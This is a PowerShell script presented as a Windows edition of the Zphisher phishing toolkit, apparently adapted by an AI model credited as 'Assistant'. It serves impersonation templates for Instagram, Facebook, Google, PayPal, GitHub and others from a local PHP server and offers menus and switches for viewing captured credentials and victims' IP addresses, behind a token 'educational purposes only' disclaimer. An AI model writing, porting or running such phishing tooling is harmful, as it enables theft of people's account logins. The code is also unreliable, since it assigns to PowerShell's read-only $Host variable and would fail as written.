param(
    [switch]$Help,
    [switch]$Auth,
    [switch]$IP
)

$Version = "2.3.5-Windows-PS"
$Host = "127.0.0.1"
$Port = "8080"
$BaseDir = Split-Path -Parent $MyInvocation.MyCommand.Path

$Colors = @{
    Red = "`e[31m"
    Green = "`e[32m"
    Orange = "`e[33m"
    Blue = "`e[34m"
    Magenta = "`e[35m"
    Cyan = "`e[36m"
    White = "`e[37m"
    Reset = "`e[0m"
}

function Write-ColorText {
    param(
        [string]$Text,
        [string]$Color = "White"
    )
    Write-Host $Colors[$Color] -NoNewline
    Write-Host $Text
    Write-Host $Colors.Reset -NoNewline
}

function Test-Command {
    param([string]$Command)
    try {
        Get-Command $Command -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Test-InternetConnection {
    try {
        $response = Invoke-WebRequest -Uri "https://api.github.com" -UseBasicParsing -TimeoutSec 3
        return $true
    } catch {
        return $false
    }
}

function Initialize-Directories {
    $directories = @(".server", "auth", ".server\www")
    foreach ($dir in $directories) {
        $path = Join-Path $BaseDir $dir
        if (!(Test-Path $path)) {
            New-Item -ItemType Directory -Path $path -Force | Out-Null
        }
    }
    
    $logFiles = @(".server\.loclx", ".server\.cld.log")
    foreach ($file in $logFiles) {
        $path = Join-Path $BaseDir $file
        if (Test-Path $path) {
            Remove-Item $path -Force
        }
    }
}

function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-ColorText "╔══════════════════════════════════════════╗" "Cyan"
    Write-ColorText "║             ZPHISHER v$Version           ║" "Cyan"
    Write-ColorText "║        Windows PowerShell Version        ║" "Cyan"
    Write-ColorText "╚══════════════════════════════════════════╝" "Cyan"
    Write-Host ""
}

function Test-Dependencies {
    Write-ColorText "[+] Checking dependencies..." "Green"
    
    $dependencies = @{
        "PHP" = "php"
        "Git" = "git"
        "Curl" = "curl"
    }
    
    $missing = @()
    
    foreach ($dep in $dependencies.GetEnumerator()) {
        if (Test-Command $dep.Value) {
            Write-ColorText "✓ $($dep.Key): Found" "Green"
        } else {
            Write-ColorText "✗ $($dep.Key): Not found" "Red"
            $missing += $dep.Key
        }
    }
    
    if ($missing.Count -gt 0) {
        Write-Host ""
        Write-ColorText "[!] Missing dependencies:" "Red"
        foreach ($dep in $missing) {
            Write-ColorText "   - $dep" "White"
        }
        Write-Host ""
        Write-ColorText "Please install the missing dependencies:" "White"
        Write-ColorText "   - PHP: https://windows.php.net/download/" "White"
        Write-ColorText "   - Git: https://git-scm.com/download/win" "White"
        Write-ColorText "   - Curl: https://curl.se/windows/" "White"
        Write-Host ""
        Read-Host "Press Enter to continue anyway"
    }
}

function Start-PHPServer {
    Write-ColorText "[+] Starting PHP server..." "Green"
    Write-ColorText "Server will be available at: http://$Host`:$Port" "White"
    Write-Host ""
    
    $wwwPath = Join-Path $BaseDir ".server\www"
    Set-Location $wwwPath
    
    try {
        $job = Start-Job -ScriptBlock {
            param($host, $port, $path)
            Set-Location $path
            php -S "$host`:$port"
        } -ArgumentList $Host, $Port, $wwwPath
        
        Write-ColorText "[+] PHP server started successfully!" "Green"
        Write-ColorText "Job ID: $($job.Id)" "White"
        Write-ColorText "To stop the server, use: Stop-Job $($job.Id)" "White"
        Write-Host ""
        
        Show-TemplateMenu
        
    } catch {
        Write-ColorText "[!] Error starting PHP server: $($_.Exception.Message)" "Red"
    }
    
    Set-Location $BaseDir
}

function Show-TemplateMenu {
    Write-ColorText "[+] Available Phishing Templates:" "Cyan"
    Write-Host ""
    
    $templates = @(
        "instagram", "facebook", "google", "twitter", "netflix",
        "paypal", "steam", "discord", "github", "linkedin"
    )
    
    for ($i = 0; $i -lt $templates.Count; $i++) {
        Write-ColorText "$($i + 1)) $($templates[$i])" "Green"
    }
    Write-ColorText "$($templates.Count + 1)) Custom template" "Green"
    Write-ColorText "$($templates.Count + 2)) Back to main menu" "White"
    Write-Host ""
    
    $choice = Read-Host "Select a template (1-$($templates.Count + 2))"
    
    if ($choice -match '^\d+$') {
        $choiceNum = [int]$choice
        if ($choiceNum -le $templates.Count) {
            $selectedTemplate = $templates[$choiceNum - 1]
            Copy-Template $selectedTemplate
        } elseif ($choiceNum -eq $templates.Count + 1) {
            $customTemplate = Read-Host "Enter custom template path"
            Copy-Template $customTemplate
        } elseif ($choiceNum -eq $templates.Count + 2) {
            return
        }
    }
}

function Copy-Template {
    param([string]$TemplateName)
    
    $templatePath = Join-Path $BaseDir ".sites\$TemplateName"
    $wwwPath = Join-Path $BaseDir ".server\www"
    
    if (Test-Path $templatePath) {
        Write-ColorText "[+] Copying $TemplateName template..." "Green"
        
        Get-ChildItem $wwwPath | Remove-Item -Recurse -Force
        
        Copy-Item "$templatePath\*" $wwwPath -Recurse -Force
        
        Write-ColorText "[+] Template copied successfully!" "Green"
        Write-ColorText "Visit http://$Host`:$Port to see the template" "White"
        Write-Host ""
        
        Show-Credentials
    } else {
        Write-ColorText "[!] Template '$TemplateName' not found!" "Red"
    }
}

function Show-Credentials {
    $authPath = Join-Path $BaseDir "auth"
    $usernamesFile = Join-Path $authPath "usernames.dat"
    $ipFile = Join-Path $authPath "ip.txt"
    
    if (Test-Path $usernamesFile) {
        Write-ColorText "[+] Captured credentials:" "Green"
        Get-Content $usernamesFile | ForEach-Object {
            Write-ColorText "   $_" "White"
        }
    }
    
    if (Test-Path $ipFile) {
        Write-ColorText "[+] Captured IP addresses:" "Green"
        Get-Content $ipFile | ForEach-Object {
            Write-ColorText "   $_" "White"
        }
    }
    
    Write-Host ""
    Read-Host "Press Enter to continue"
}

function Show-MainMenu {
    do {
        Show-Banner
        Write-ColorText "Available Options:" "White"
        Write-Host ""
        Write-ColorText "1) Start Localhost Server" "Green"
        Write-ColorText "2) View Captured Credentials" "Green"
        Write-ColorText "3) View Captured IPs" "Green"
        Write-ColorText "4) Check Dependencies" "Green"
        Write-ColorText "5) About" "Green"
        Write-ColorText "6) Exit" "Red"
        Write-Host ""
        
        $choice = Read-Host "Select an option (1-6)"
        
        switch ($choice) {
            "1" { Start-PHPServer }
            "2" { 
                $authFile = Join-Path $BaseDir "auth\usernames.dat"
                if (Test-Path $authFile) {
                    Get-Content $authFile
                } else {
                    Write-ColorText "No credentials captured yet." "Orange"
                }
                Read-Host "Press Enter to continue"
            }
            "3" { 
                $ipFile = Join-Path $BaseDir "auth\ip.txt"
                if (Test-Path $ipFile) {
                    Get-Content $ipFile
                } else {
                    Write-ColorText "No IPs captured yet." "Orange"
                }
                Read-Host "Press Enter to continue"
            }
            "4" { 
                Test-Dependencies
                Read-Host "Press Enter to continue"
            }
            "5" { 
                Show-About
                Read-Host "Press Enter to continue"
            }
            "6" { 
                Write-ColorText "[!] Exiting Zphisher..." "Red"
                Write-ColorText "Thank you for using Zphisher Windows PowerShell Edition!" "White"
                Start-Sleep -Seconds 2
                exit
            }
            default { 
                Write-ColorText "[!] Invalid option. Please try again." "Red"
                Start-Sleep -Seconds 1
            }
        }
    } while ($true)
}

function Show-About {
    Show-Banner
    Write-ColorText "╔══════════════════════════════════════════╗" "Cyan"
    Write-ColorText "║                ABOUT                     ║" "Cyan"
    Write-ColorText "╚══════════════════════════════════════════╝" "Cyan"
    Write-Host ""
    Write-ColorText "Zphisher is an automated phishing tool with 30+ templates." "White"
    Write-ColorText "This Windows PowerShell version maintains the same functionality." "White"
    Write-Host ""
    Write-ColorText "DISCLAIMER:" "Red"
    Write-ColorText "This tool is for educational purposes only." "White"
    Write-ColorText "Do not use for malicious purposes." "White"
    Write-Host ""
    Write-ColorText "Original Author: TAHMID RAYAT" "Cyan"
    Write-ColorText "Windows Adaptation: Assistant" "Cyan"
}

if ($Help) {
    Write-ColorText "Zphisher Windows PowerShell Edition" "Cyan"
    Write-Host ""
    Write-ColorText "Usage:" "White"
    Write-ColorText "  .\zphisher.ps1              - Start interactive mode" "White"
    Write-ColorText "  .\zphisher.ps1 -Auth        - View captured credentials" "White"
    Write-ColorText "  .\zphisher.ps1 -IP          - View captured IPs" "White"
    Write-ColorText "  .\zphisher.ps1 -Help        - Show this help" "White"
    exit
}

if ($Auth) {
    $authFile = Join-Path $BaseDir "auth\usernames.dat"
    if (Test-Path $authFile) {
        Get-Content $authFile
    } else {
        Write-ColorText "No credentials captured yet." "Orange"
    }
    exit
}

if ($IP) {
    $ipFile = Join-Path $BaseDir "auth\ip.txt"
    if (Test-Path $ipFile) {
        Get-Content $ipFile
    } else {
        Write-ColorText "No IPs captured yet." "Orange"
    }
    exit
}

Initialize-Directories
Test-Dependencies
Show-MainMenu
